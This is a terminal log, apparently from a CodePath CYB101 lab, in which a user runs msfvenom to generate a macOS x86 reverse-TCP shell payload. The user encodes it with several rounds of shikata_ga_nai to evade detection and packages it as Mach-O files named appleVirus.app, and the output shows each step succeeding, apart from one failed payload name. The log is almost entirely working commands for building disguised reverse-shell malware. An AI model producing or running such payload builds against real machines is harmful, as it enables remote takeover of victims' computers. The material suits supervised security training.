codepath@idx-cyb101-idx-1729434609892:~$  msfvenom -a x86 --platform osx \
  -p osx/x86/shell_reverse_tcp TEXT="Encrypted Virus" \
  -e x86/shikata_ga_nai -i 3 -f python -o messageEncrypted
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 92 (iteration=0)
x86/shikata_ga_nai succeeded with size 119 (iteration=1)
x86/shikata_ga_nai succeeded with size 146 (iteration=2)
x86/shikata_ga_nai chosen with final size 146
Payload size: 146 bytes
Final size of python file: 738 bytes
Saved as: messageEncrypted
codepath@idx-cyb101-idx-1729434609892:~$ msfvenom -c messageEncrypted -a x86 \
  --platform osx -p osx/x86/shell_reverse_tcp/speak_pwned \
  -f macho -o appleVirus.app
Error: invalid payload: osx/x86/shell_reverse_tcp/speak_pwned
codepath@idx-cyb101-idx-1729434609892:~$ msfvenom -a x86 --platform osx \
  -p osx/x86/shell_reverse_tcp TEXT="Encrypted Virus" \
  -e x86/shikata_ga_nai -i 3 -f python -o messageEncrypted
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 92 (iteration=0)
x86/shikata_ga_nai succeeded with size 119 (iteration=1)
x86/shikata_ga_nai succeeded with size 146 (iteration=2)
x86/shikata_ga_nai chosen with final size 146
Payload size: 146 bytes
Final size of python file: 738 bytes
Saved as: messageEncrypted
codepath@idx-cyb101-idx-1729434609892:~$ msfvenom -c messageEncrypted -a x86 \
  --platform osx -p osx/x86/shell_reverse_tcp \
  -f macho -o appleVirus.app
No encoder specified, outputting raw payload
Payload size: 65 bytes
Final size of macho file: 20800 bytes
Saved as: appleVirus.app
codepath@idx-cyb101-idx-1729434609892:~$ msfvenom -a x86 --platform osx \
  -p osx/x86/shell_reverse_tcp TEXT="Virus Executed" \
  -f raw > shell_reverse_tcp
No encoder specified, outputting raw payload
Payload size: 65 bytes

codepath@idx-cyb101-idx-1729434609892:~$ msfvenom -c messageBox -a x86 --platform osx \
  -p osx/x86/shell_reverse_tcp -f macho -o applevirus.app
No encoder specified, outputting raw payload
Payload size: 65 bytes
Final size of macho file: 20800 bytes
Saved as: applevirus.app
